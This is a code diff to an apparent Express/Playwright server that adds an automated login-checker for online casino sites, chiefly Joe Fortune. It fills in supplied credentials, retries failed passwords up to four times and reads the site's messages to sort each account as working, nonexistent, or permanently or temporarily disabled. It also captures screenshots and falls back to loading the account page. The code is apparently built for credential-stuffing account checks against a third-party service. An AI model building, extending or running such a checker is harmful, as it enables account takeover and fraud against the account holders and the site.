@@ -479,29 +479,86 @@ app.get('/api/status', (req, res) => {
 
 // ── API: Login Check ─────────────────────────────────────────────────────────
 
+/** Maximum number of login attempts before declaring noAcc. */
+const MAX_LOGIN_ATTEMPTS = 4;
+
+/** How long to poll for a known response after each submit (ms). */
+const RESPONSE_POLL_MS = 5000;
+
+/** Poll interval while waiting for a response (ms). */
+const POLL_INTERVAL_MS = 500;
+
+/**
+ * Response type codes returned by waitForLoginResponse.
+ * @readonly
+ * @enum {string}
+ */
+const RESP = {
+  SUCCESS:       'success',
+  PERM_DISABLED: 'permDisabled',
+  TEMP_DISABLED: 'tempDisabled',
+  WRONG_PASS_1:  'wrongPass1',   // "Oops! Your email and/or password are incorrect"
+  WRONG_PASS_2:  'wrongPass2',   // "Your email and/or password remain incorrect"
+  UNKNOWN:       'unknown',      // timed out with no recognised pattern
+};
+
+/**
+ * Polls the page body every POLL_INTERVAL_MS for up to maxWaitMs to detect
+ * a known login response. Returns a RESP code as soon as one is found, or
+ * RESP.UNKNOWN if the timeout expires with no match.
+ *
+ * Checking this way (rather than a fixed wait) means we react the moment
+ * Joe Fortune renders a result rather than always waiting the full delay.
+ *
+ * @param {import('playwright').Page} page
+ * @param {number} [maxWaitMs=5000]
+ * @returns {Promise<string>} One of the RESP constants.
+ */
+async function waitForLoginResponse(page, maxWaitMs = RESPONSE_POLL_MS) {
+  const deadline = Date.now() + maxWaitMs;
+  while (Date.now() < deadline) {
+    const body = (await page.textContent('body').catch(() => '')).toLowerCase();
+
+    // ── Success ──────────────────────────────────────────────────────────
+    if (/welcome\s*!/.test(body)) return RESP.SUCCESS;
+    if (/hot pokies|new & exclusive|specialty games/.test(body)) return RESP.SUCCESS;
+
+    // ── Disabled ─────────────────────────────────────────────────────────
+    if (/your account has been disabled.*contact customer service/i.test(body)) return RESP.PERM_DISABLED;
+    if (/temporarily disabled due to too many failed login attempt/i.test(body)) return RESP.TEMP_DISABLED;
+    if (/account.*banned|banned.*account/i.test(body)) return RESP.PERM_DISABLED;
+
+    // ── Wrong password signals ────────────────────────────────────────────
+    if (/your email and\/or password remain incorrect.*further failed attempt/i.test(body)) return RESP.WRONG_PASS_2;
+    if (/oops.*your email and\/or password are incorrect.*caps lock/i.test(body)) return RESP.WRONG_PASS_1;
+
+    await page.waitForTimeout(POLL_INTERVAL_MS);
+  }
+  return RESP.UNKNOWN;
+}
+
 /**
  * POST /api/login-check
  * Performs a real Playwright login attempt against the target casino site.
- * Takes 4 real browser screenshots at key moments during the attempt.
+ *
+ * Flow:
+ *  1. Navigate to login page, dismiss cookies, fill credentials → SCR 1/4
+ *  2. Submit and poll up to 5 s for a known response → SCR 2/4
+ *  3. If wrong-password: re-fill and retry up to 4 total attempts → SCR 3/4
+ *  4. If still unclear after 4 attempts: navigate to /account as fallback
+ *  5. SCR 4/4 — final state
  *
  * Request body:
- *   site       {string} 'joe' | 'ign' — which casino
- *   username   {string} email/username
- *   password   {string} password
- *   loginUrl   {string} URL of the login page
- *   timeout    {number} optional page timeout ms (default 30000)
+ *   site       {string} 'joe' | 'ign'
+ *   username   {string}
+ *   password   {string}
+ *   loginUrl   {string}
+ *   timeout    {number} optional page timeout ms
  *
- * Response:
- *   outcome    {string} 'working' | 'noAcc' | 'permDisabled' | 'tempDisabled'
- *   note       {string} human-readable result description
- *   shots      {string[]} array of 4 base64 PNG data URLs (real browser screenshots)
- *     [0] form filled before submit
- *     [1] first response after clicking submit
- *     [2] after page has settled (~3 seconds)
- *     [3] final state with outcome determined
+ * Response: { outcome, note, shots: [4 base64 PNGs] }
  */
 app.post('/api/login-check', async (req, res) => {
-  const { username, password, loginUrl, timeout = NAV_TIMEOUT } = req.body;
+  const { site, username, password, loginUrl, timeout = NAV_TIMEOUT } = req.body;
   if (!username || !password || !loginUrl) {
     return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
   }
@@ -520,49 +577,100 @@ app.post('/api/login-check', async (req, res) => {
     const page = await context.newPage();
     page.setDefaultTimeout(timeout);
 
-    // Navigate to login page
+    // ── Step 1: Load login page ───────────────────────────────────────────
     await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
     await page.waitForTimeout(2000);
     await dismissCookiePopup(page);
 
-    // Fill the login form
     const filled = await fillLoginForm(page, username, password);
-    if (!filled) {
-      note = 'Could not find login form fields on page';
-    }
+    if (!filled) note = 'Could not locate login form fields on page';
 
-    // Shot 1: form filled, ready to submit
+    // SCR 1/4 — form filled, ready to submit
     shots[0] = await captureShot(page, 'SCR 1/4');
 
-    // Click submit
-    const clicked = await clickSubmit(page);
-    if (!clicked && filled) {
-      await page.keyboard.press('Enter');
+    // ── Step 2–3: Submit with retry loop (up to MAX_LOGIN_ATTEMPTS) ───────
+    let respType = RESP.UNKNOWN;
+
+    for (let attempt = 1; attempt <= MAX_LOGIN_ATTEMPTS; attempt++) {
+      // Re-fill credentials on retries (form may have cleared)
+      if (attempt > 1) {
+        await fillLoginForm(page, username, password);
+        await page.waitForTimeout(300);
+      }
+
+      // Submit
+      const clicked = await clickSubmit(page);
+      if (!clicked) await page.keyboard.press('Enter');
+
+      // Poll up to 5 s for a known response
+      respType = await waitForLoginResponse(page);
+      await dismissCookiePopup(page);
+
+      // Capture SCR 2/4 after first submit, SCR 3/4 after last retry
+      if (attempt === 1)                   shots[1] = await captureShot(page, 'SCR 2/4');
+      if (attempt === MAX_LOGIN_ATTEMPTS)  shots[2] = await captureShot(page, 'SCR 3/4');
+
+      if (respType === RESP.SUCCESS) {
+        outcome = 'working';
+        note = 'Joe Fortune — login successful';
+        break;
+      }
+      if (respType === RESP.PERM_DISABLED) {
+        outcome = 'permDisabled';
+        note = 'Joe Fortune — account permanently disabled (contact Customer Service)';
+        break;
+      }
+      if (respType === RESP.TEMP_DISABLED) {
+        outcome = 'tempDisabled';
+        note = 'Joe Fortune — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.';
+        break;
+      }
+      if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2) {
+        if (attempt === MAX_LOGIN_ATTEMPTS) {
+          outcome = 'noAcc';
+          note = `Joe Fortune — incorrect credentials after ${MAX_LOGIN_ATTEMPTS} attempts (account does not exist or wrong password)`;
+        }
+        // else: loop again for next attempt
+        continue;
+      }
+      // UNKNOWN: no pattern matched — stop retrying, fall through to fallback
+      break;
     }
 
-    // Shot 2: immediately after submit (first response)
-    await page.waitForTimeout(1500);
-    await dismissCookiePopup(page);
-    shots[1] = await captureShot(page, 'SCR 2/4');
+    // Take SCR 3/4 if not already captured (fewer than MAX_LOGIN_ATTEMPTS retries)
+    if (!shots[2]) shots[2] = await captureShot(page, 'SCR 3/4');
 
-    // Wait for page to settle
-    try {
-      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
-    } catch {
-      // Network may never be idle on SPAs — continue anyway
+    // ── Step 4: Fallback account-page check ───────────────────────────────
+    // If outcome is still unclear (UNKNOWN response type), try navigating
+    // directly to the account page. If it loads without redirecting to login,
+    // the session is active → working.
+    if (respType === RESP.UNKNOWN || (respType !== RESP.SUCCESS && outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled')) {
+      try {
+        const accountUrl = site === 'ign'
+          ? loginUrl.replace(/\/login.*$/, '/account')
+          : 'https://joefortunepokies.win/account';
+        await page.goto(accountUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
+        await page.waitForTimeout(2000);
+        await dismissCookiePopup(page);
+        const finalUrl = page.url().toLowerCase();
+        if (!finalUrl.includes('/login') && !finalUrl.includes('/sign-in') && !finalUrl.includes('/signin')) {
+          outcome = 'working';
+          note = 'Joe Fortune — account page loaded without redirect (fallback verification — logged in)';
+        } else {
+          if (outcome !== 'noAcc') {
+            outcome = 'noAcc';
+            note = 'Joe Fortune — redirected back to login (not logged in)';
+          }
+        }
+      } catch (fallbackErr) {
+        if (outcome !== 'noAcc' && outcome !== 'permDisabled' && outcome !== 'tempDisabled') {
+          outcome = 'noAcc';
+          note = `Fallback check failed: ${fallbackErr.message}`;
+        }
+      }
     }
-    await page.waitForTimeout(1500);
-    await dismissCookiePopup(page);
 
-    // Shot 3: after page settled
-    shots[2] = await captureShot(page, 'SCR 3/4');
-
-    // Determine outcome
-    const result = await determineLoginOutcome(page, loginUrl);
-    outcome = result.outcome;
-    note = result.note;
-
-    // Shot 4: final state
+    // SCR 4/4 — final state
     shots[3] = await captureShot(page, 'SCR 4/4');
 
   } catch (err) {
